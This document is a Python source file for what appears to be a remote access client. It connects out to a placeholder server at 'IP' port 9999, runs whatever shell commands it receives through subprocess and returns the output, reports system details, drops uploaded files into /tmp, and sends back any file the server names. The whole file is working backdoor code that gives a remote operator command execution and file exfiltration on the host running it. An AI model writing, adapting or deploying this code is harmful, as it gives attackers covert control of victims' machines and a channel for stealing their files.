from socket_factory import SocketFactory
from socket_api import SocketApi
import protocol
import packets
import platform
import subprocess
import os
import re
from base64 import b64encode

# Create the socket api object.
socket = SocketApi(SocketFactory.client('IP', 9999))

def success_packet(content=None, params={}):
    """Return a response packet with success code."""
    return  packets.Packet(content=content, params=params, code=protocol.SUCCESS_CODE)

def error_packet(content=None, params={}):
    """Return a response packet with error code."""
    return  packets.Packet(content=content, params=params, code=protocol.ERROR_CODE)

while True:
    data = socket.recv()
    if data is None:
        # Jump out the loop when receive None data from socket.
        break 
    code, content, params = protocol.from_packet(data)
    if code is protocol.GET_INFO:
        # Register system information on dict parameters.
        params = {
            'system': platform.system(), 
            'version': platform.version(), 
            'node': platform.node(), 
            'machine':platform.machine()
        }

        # Send the parameters through socket with packet.
        packet = success_packet(params=params)
    elif code is protocol.CMD:
        # Execute a command and save output.
        output = subprocess.check_output(content)

        # Send the output to socket.
        packet = success_packet(content=output)
    elif code is protocol.UPLOAD:
        if type(content) is bytes:
            mode = 'wb'
        else:
            mode = 'w'
        name = re.sub(r'[\/, \=, \\]', '', b64encode(os.urandom(10)).decode())

        if 'name' in params:
            # Find extension from file name.
            extension = os.path.splitext(params['name'][0])[1]
            name += extension 
        with open(os.path.join('/tmp/', name), mode) as handler:
            # Write packet content on file.
            handler.write(content)
        packet = success_packet()
    elif code is protocol.DOWNLOAD:
        if not 'filename' in params:
            packet = error_packet(content='Invalid upload parameters.')
        else:
            if os.path.isfile(params['filename'][0]):
                content = None
                with open(params['filename'][0], 'rb') as handler:
                    # Read file content.
                    content = handler.read()
                packet = success_packet(content=content)
            else:
                packet = error_packet(content='No such file or directory.')
    socket.send(packet)
